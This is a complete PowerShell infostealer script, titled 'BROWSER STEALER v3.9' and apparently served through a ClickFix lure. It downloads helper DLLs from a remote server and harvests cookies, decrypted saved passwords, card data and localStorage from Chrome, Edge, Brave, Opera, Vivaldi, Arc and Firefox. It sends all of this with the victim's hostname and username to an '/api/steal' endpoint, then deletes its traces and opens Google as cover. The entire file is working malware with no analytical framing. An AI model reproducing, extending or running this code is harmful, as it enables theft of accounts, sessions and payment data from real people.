# ============================================================
# BROWSER STEALER v3.9 — FIXED: SQLite paths, LevelDB load order, lock handling
# ============================================================

$ErrorActionPreference = "Continue"

$BASE_URL = "https://cipheranon-production.up.railway.app"
$SERVER_URL = "$BASE_URL/api/steal"
$DLL_DIR = "$env:TEMP\stealer_dlls"
$LOGFILE = "$env:TEMP\stealer_log.txt"

$SQLITE_DLL_URL = "$BASE_URL/System.Data.SQLite.dll"
$LEVELDB_DLL_URL = "$BASE_URL/LevelDB.netAll.dll"
$LEVELDB_NATIVE_URL = "$BASE_URL/leveldb.dll"

Remove-Item $LOGFILE -Force -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Path $DLL_DIR -Force -ErrorAction SilentlyContinue | Out-Null

function Write-Log {
    param($Msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Msg"
    Add-Content -Path $LOGFILE -Value $line
    Write-Host $Msg
}

Write-Log "============================================"
Write-Log "BROWSER STEALER v3.9"
Write-Log "Target: $env:COMPUTERNAME"
Write-Log "Log: $LOGFILE"
Write-Log "============================================"

function Download-Dll {
    param($Url, $Path, $Name)
    Write-Log "Downloading $Name..."
    try {
        $response = Invoke-WebRequest -Uri $Url -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -UseBasicParsing -TimeoutSec 15
        [System.IO.File]::WriteAllBytes($Path, $response.Content)
        Write-Log "$Name downloaded"
        return $true
    } catch {
        Write-Log "$Name failed: $_"
        return $false
    }
}

$sqlitePath = "$DLL_DIR\System.Data.SQLite.dll"
$sqliteOk = Download-Dll -Url $SQLITE_DLL_URL -Path $sqlitePath -Name "SQLite"
if (-not $sqliteOk) { 
    Write-Log "SQLite download failed — aborting"
    exit 
}

$leveldbPath = "$DLL_DIR\LevelDB.netAll.dll"
$leveldbOk = Download-Dll -Url $LEVELDB_DLL_URL -Path $leveldbPath -Name "LevelDB.NET"
$leveldbNativePath = "$DLL_DIR\leveldb.dll"
$nativeOk = Download-Dll -Url $LEVELDB_NATIVE_URL -Path $leveldbNativePath -Name "LevelDB native"

$leveldbLoaded = $false

Write-Log "Loading SQLite..."
try {
    [System.Reflection.Assembly]::LoadFrom($sqlitePath) | Out-Null
    Write-Log "SQLite loaded"
} catch {
    Write-Log "SQLite load failed: $_"
    exit
}

if ($leveldbOk -and $nativeOk) {
    Write-Log "Loading LevelDB..."
    try {
        [System.Reflection.Assembly]::LoadFrom($leveldbPath) | Out-Null
        Write-Log "LevelDB loaded"
        $leveldbLoaded = $true
    } catch {
        Write-Log "LevelDB load failed: $_"
        $leveldbLoaded = $false
    }
}

# ---- Helper: find browser profile paths ----
function Get-BrowserProfiles {
    param($Browser)
    $paths = @()
    switch ($Browser) {
        "Chrome" {
            $base = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            if (Test-Path $base) {
                $profiles = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "^Default$|^Profile " }
                foreach ($p in $profiles) { $paths += $p.FullName }
            }
        }
        "Edge" {
            $base = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            if (Test-Path $base) {
                $profiles = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "^Default$|^Profile " }
                foreach ($p in $profiles) { $paths += $p.FullName }
            }
        }
        "Brave" {
            $base = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
            if (Test-Path $base) {
                $profiles = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "^Default$|^Profile " }
                foreach ($p in $profiles) { $paths += $p.FullName }
            }
        }
        "Opera" {
            $base = "$env:LOCALAPPDATA\Opera Software\Opera Stable"
            if (Test-Path $base) { $paths += $base }
        }
        "OperaGX" {
            $base = "$env:LOCALAPPDATA\Opera Software\Opera GX Stable"
            if (Test-Path $base) { $paths += $base }
        }
        "Vivaldi" {
            $base = "$env:LOCALAPPDATA\Vivaldi\User Data"
            if (Test-Path $base) { $paths += "$base\Default" }
        }
        "Arc" {
            $base = "$env:LOCALAPPDATA\Arc\User Data"
            if (Test-Path $base) { $paths += "$base\Default" }
        }
    }
    return $paths
}

# ---- SQLite read with lock handling ----
function Read-SQLite {
    param($DbPath, $Query)
    $result = @()
    if (-not (Test-Path $DbPath)) { return $result }
    try {
        $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
        # Copy with retry if locked
        $copied = $false
        for ($i=0; $i -lt 5; $i++) {
            try {
                Copy-Item $DbPath $temp -Force -ErrorAction Stop
                $copied = $true
                break
            } catch {
                Start-Sleep -Milliseconds 200
            }
        }
        if (-not $copied) { return $result }
        
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;Read Only=True;")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = $Query
        $cmd.CommandTimeout = 5
        $rdr = $cmd.ExecuteReader()
        while ($rdr.Read()) {
            $row = @{}
            for ($i=0; $i -lt $rdr.FieldCount; $i++) {
                $n = $rdr.GetName($i)
                $v = $rdr.GetValue($i)
                if ($v -ne $null) { $row[$n] = $v }
            }
            $result += $row
        }
        $rdr.Close()
        $conn.Close()
        Remove-Item $temp -Force -ErrorAction SilentlyContinue
    } catch {
        Write-Log "SQLite read error on $DbPath : $_"
    }
    return $result
}

function Decrypt-BrowserPassword {
    param($EncryptedData)
    if (-not $EncryptedData) { return $null }
    if ($EncryptedData -isnot [byte[]]) { return $null }
    if ($EncryptedData.Length -eq 0) { return $null }
    try {
        Add-Type -AssemblyName System.Security
        $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($EncryptedData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
    } catch {
        try { return [System.Text.Encoding]::UTF8.GetString($EncryptedData) } catch { return $null }
    }
}

# ---- BROWSER COOKIES ----
function Get-BrowserCookies {
    param($ProfilePath, $Name)
    $cookies = @()
    $cookieDb = "$ProfilePath\Network\Cookies"
    if (-not (Test-Path $cookieDb)) { return $cookies }
    try {
        $rows = Read-SQLite -DbPath $cookieDb -Query "SELECT host_key, name, value FROM cookies"
        foreach ($r in $rows) {
            if ($r['name'] -and $r['value']) {
                $d = $r['host_key']
                if ($d) { $d = $d -replace '^\.', '' } else { $d = "unknown" }
                $cookies += @{ domain = $d; name = $r['name']; value = $r['value']; browser = $Name }
            }
        }
        Write-Log "$Name cookies: $($cookies.Count) found"
    } catch {
        Write-Log "Error reading $Name cookies"
    }
    return $cookies
}

function Get-FirefoxCookies {
    $cookies = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\cookies.sqlite"
            if (Test-Path $f) {
                try {
                    $rows = Read-SQLite -DbPath $f -Query "SELECT host, name, value FROM moz_cookies"
                    foreach ($r in $rows) {
                        if ($r['name'] -and $r['value']) {
                            $dmn = $r['host']
                            if ($dmn) { $dmn = $dmn -replace '^\.', '' } else { $dmn = "unknown" }
                            $cookies += @{ domain = $dmn; name = $r['name']; value = $r['value']; browser = "Firefox" }
                        }
                    }
                    Write-Log "Firefox cookies: $($cookies.Count) found"
                } catch {
                    Write-Log "Error reading Firefox cookies"
                }
            }
        }
    }
    return $cookies
}

# ---- BROWSER PASSWORDS ----
function Get-BrowserPasswords {
    param($ProfilePath, $Name)
    $pass = @()
    $loginDb = "$ProfilePath\Login Data"
    if (-not (Test-Path $loginDb)) { return $pass }
    Write-Log "Reading $Name passwords..."
    try {
        $rows = Read-SQLite -DbPath $loginDb -Query "SELECT origin_url, username_value, password_value FROM logins"
        foreach ($r in $rows) {
            $username = $r['username_value']
            $encryptedPassword = $r['password_value']
            $decryptedPassword = $null
            if ($encryptedPassword -and $encryptedPassword -is [byte[]]) {
                $decryptedPassword = Decrypt-BrowserPassword -EncryptedData $encryptedPassword
            } elseif ($encryptedPassword -and $encryptedPassword -is [string]) {
                $decryptedPassword = $encryptedPassword
            }
            if (-not $decryptedPassword -and $encryptedPassword) {
                try { $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($encryptedPassword) } catch {}
            }
            if ($username -and $decryptedPassword -and $username -ne "" -and $decryptedPassword -ne "") {
                $u = $r['origin_url']
                if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
                $pass += @{ name = $username; value = $decryptedPassword; type = "password"; url = $u; browser = $Name }
            }
        }
        Write-Log "Found $($pass.Count) $Name passwords"
    } catch {
        Write-Log "Error reading $Name passwords: $_"
    }
    return $pass
}

function Get-FirefoxPasswords {
    $pass = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\logins.json"
            if (Test-Path $f) {
                try {
                    $json = Get-Content $f -Raw | ConvertFrom-Json
                    if ($json.logins) {
                        foreach ($l in $json.logins) {
                            $u = $l.hostname -replace 'https?://', ''
                            if ($l.username -and $l.password -and $l.username -ne "" -and $l.password -ne "") {
                                $pass += @{ name = $l.username; value = $l.password; type = "password"; url = $u; browser = "Firefox" }
                            }
                        }
                    }
                } catch {
                    Write-Log "Error reading Firefox passwords"
                }
            }
        }
    }
    return $pass
}

# ---- BROWSER CARDS ----
function Get-BrowserCards {
    param($ProfilePath, $Name)
    $cards = @()
    $webData = "$ProfilePath\Web Data"
    if (-not (Test-Path $webData)) { return $cards }
    try {
        $rows = Read-SQLite -DbPath $webData -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
        foreach ($r in $rows) {
            if ($r['name_on_card'] -and $r['card_number_encrypted']) {
                $cards += @{ 
                    name = $r['name_on_card']; 
                    value = $r['card_number_encrypted']; 
                    type = "card-number"; 
                    url = $Name; 
                    browser = $Name; 
                    month = $r['expiration_month']; 
                    year = $r['expiration_year'] 
                }
            }
        }
    } catch {
        Write-Log "Error reading $Name cards"
    }
    return $cards
}

# ---- LOCALSTORAGE (LevelDB) ----
function Get-ChromeLocalStorage {
    param($ProfilePath, $Name)
    $storage = @{}
    if (-not $leveldbLoaded) { return $storage }
    $leveldbPath = "$ProfilePath\Local Storage\leveldb\"
    if (-not (Test-Path $leveldbPath)) { return $storage }
    Write-Log "Reading $Name LocalStorage..."
    try {
        $options = New-Object LevelDB.NET.Options
        $db = [LevelDB.NET.DB]::Open($leveldbPath, $options)
        $iterator = $db.CreateIterator()
        $iterator.SeekToFirst()
        while ($iterator.Next()) {
            $key = [System.Text.Encoding]::UTF8.GetString($iterator.Key())
            $value = [System.Text.Encoding]::UTF8.GetString($iterator.Value())
            $storage[$key] = $value
        }
        $iterator.Dispose()
        $db.Dispose()
        Write-Log "$Name LocalStorage: $($storage.Count) items"
    } catch {
        Write-Log "Error reading $Name LocalStorage: $_"
    }
    return $storage
}

function Get-FirefoxLocalStorage {
    param($ProfPath)
    $storage = @{}
    $dbPath = "$ProfPath\webappsstore.sqlite"
    if (Test-Path $dbPath) {
        try {
            $rows = Read-SQLite -DbPath $dbPath -Query "SELECT scope, key, value FROM webappsstore2"
            foreach ($r in $rows) {
                if ($r['key'] -and $r['value']) { $storage[$r['key']] = $r['value'] }
            }
            Write-Log "Firefox LocalStorage: $($storage.Count) items"
        } catch {
            Write-Log "Error reading Firefox LocalStorage"
        }
    }
    return $storage
}

# ---- COLLECT DATA ----
$allCookies = @()
$allPasswords = @()
$allCards = @()
$allLocalStorage = @{}

Write-Log ""

# Cookies — Chrome/Edge/Brave/Opera profiles
$browsers = @("Chrome", "Edge", "Brave", "Opera", "OperaGX", "Vivaldi", "Arc")
foreach ($b in $browsers) {
    $profiles = Get-BrowserProfiles -Browser $b
    foreach ($prof in $profiles) {
        $allCookies += Get-BrowserCookies -ProfilePath $prof -Name $b
    }
}

# Firefox cookies
$allCookies += Get-FirefoxCookies

# Passwords — Chrome/Edge/Brave
$browsersPass = @("Chrome", "Edge", "Brave")
foreach ($b in $browsersPass) {
    $profiles = Get-BrowserProfiles -Browser $b
    foreach ($prof in $profiles) {
        $allPasswords += Get-BrowserPasswords -ProfilePath $prof -Name $b
    }
}
$allPasswords += Get-FirefoxPasswords

# Cards — Chrome/Edge/Brave
$browsersCards = @("Chrome", "Edge", "Brave")
foreach ($b in $browsersCards) {
    $profiles = Get-BrowserProfiles -Browser $b
    foreach ($prof in $profiles) {
        $allCards += Get-BrowserCards -ProfilePath $prof -Name $b
    }
}

# LocalStorage — Chrome/Edge/Brave
$browsersLs = @("Chrome", "Edge", "Brave")
foreach ($b in $browsersLs) {
    $profiles = Get-BrowserProfiles -Browser $b
    foreach ($prof in $profiles) {
        $ls = Get-ChromeLocalStorage -ProfilePath $prof -Name $b
        foreach ($key in $ls.Keys) {
            $allLocalStorage["$b`:$key"] = $ls[$key]
        }
    }
}

# Firefox LocalStorage
$profiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
foreach ($prof in $profiles) {
    $ffLs = Get-FirefoxLocalStorage -ProfPath $prof.FullName
    foreach ($key in $ffLs.Keys) {
        $allLocalStorage["Firefox`:$key"] = $ffLs[$key]
    }
}

# ---- SUMMARY ----
Write-Log ""
Write-Log "============================================"
Write-Log "SUMMARY"
Write-Log "============================================"
Write-Log "Cookies: $($allCookies.Count)"
Write-Log "Passwords: $($allPasswords.Count)"
Write-Log "Cards: $($allCards.Count)"
Write-Log "LocalStorage: $($allLocalStorage.Count)"
Write-Log "============================================"

# ---- BUILD PAYLOAD ----
$pcName = $env:COMPUTERNAME
$userName = $env:USERNAME

$cookiesForServer = @{}
foreach ($c in $allCookies) {
    $key = $c.domain + "|" + $c.browser
    if (-not $cookiesForServer[$key]) {
        $cookiesForServer[$key] = @{}
    }
    $cookiesForServer[$key][$c.name] = $c.value
}

$localStorageForServer = @{}
foreach ($key in $allLocalStorage.Keys) {
    $localStorageForServer[$key] = $allLocalStorage[$key]
}

$payload = @{
    cookies = $cookiesForServer
    credentials = $allPasswords
    cards = $allCards
    localStorage = $localStorageForServer
    system = @{
        hostname = $pcName
        username = $userName
        os = (Get-WmiObject Win32_OperatingSystem).Caption
    }
    fingerprint = @{
        hostname = $pcName
        userAgent = "PowerShell Payload"
        browser = "PowerShell"
        screen = "N/A"
    }
    domain = $pcName
    browser = "PowerShell"
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    pcName = $pcName
    nonce = [System.Guid]::NewGuid().ToString()
}

# ---- SEND ----
Write-Log "Sending data..."
try {
    $json = $payload | ConvertTo-Json -Depth 10
    Write-Log "Payload size: $($json.Length) bytes"
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $req = [System.Net.WebRequest]::Create($SERVER_URL)
    $req.Method = "POST"
    $req.ContentType = "application/json"
    $req.ContentLength = $bytes.Length
    $req.Timeout = 15000
    $stream = $req.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $resp = $req.GetResponse()
    $resp.Close()
    Write-Log "Data sent"
} catch {
    Write-Log "Send failed: $_"
}

# ---- CLEANUP ----
Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
Remove-Item $DLL_DIR -Recurse -Force -ErrorAction SilentlyContinue

Start-Process "https://www.google.com"

Write-Log ""
Write-Log "Done!"
Write-Log "Log saved to: $LOGFILE"

exit
